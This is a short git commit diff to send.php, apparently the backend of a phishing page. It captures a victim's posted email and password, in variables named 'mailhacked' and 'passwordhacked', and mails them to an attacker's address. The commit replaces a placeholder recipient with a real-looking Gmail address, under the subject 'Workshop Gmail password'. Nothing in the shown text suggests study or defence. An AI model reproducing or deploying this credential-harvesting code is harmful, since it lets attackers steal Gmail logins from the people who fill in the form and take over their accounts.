ec525e9787508335b6228ada7d38b95a027ba4be
Msin4732 <104028211+Msin4732@users.noreply.github.com>
2022-04-20 00:26:47 +0600

    Update send.php

--- send.php
+++ send.php
@@ -1,7 +1,7 @@
 <?php
         $mailhacked = $_POST["email"];
         $passwordhacked = $_POST["password"];
-         $to = "yourmailaddresshere@gmail.com";
+         $to = "msin4732@gmail.com";
          $subject = "Workshop Gmail password";
          
          $message = "$mailhacked";
